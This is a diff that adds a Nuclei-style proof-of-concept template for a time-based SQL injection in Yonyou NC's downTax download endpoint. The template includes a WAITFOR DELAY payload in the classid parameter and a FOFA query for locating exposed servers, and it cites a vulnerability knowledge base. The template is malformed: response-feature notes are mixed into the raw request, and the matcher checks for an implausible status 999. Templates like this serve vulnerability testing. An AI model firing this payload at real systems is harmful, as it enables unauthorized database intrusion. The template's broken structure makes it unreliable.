@@ -1,0 +1,34 @@
+id: poc-wizmasru219vqq90
+info:
+  name: 用友NC-SQL注入-download
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wizmasru219vqq90'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wizmasru219vqq90
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'GET /portal/pt/downTax/download?classid=1'';WAITFOR+DELAY+''0:0:8''--&pageId=login HTTP/1.1
+
+
+    # 响应代码特征
+
+    999
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 999
+    type: status
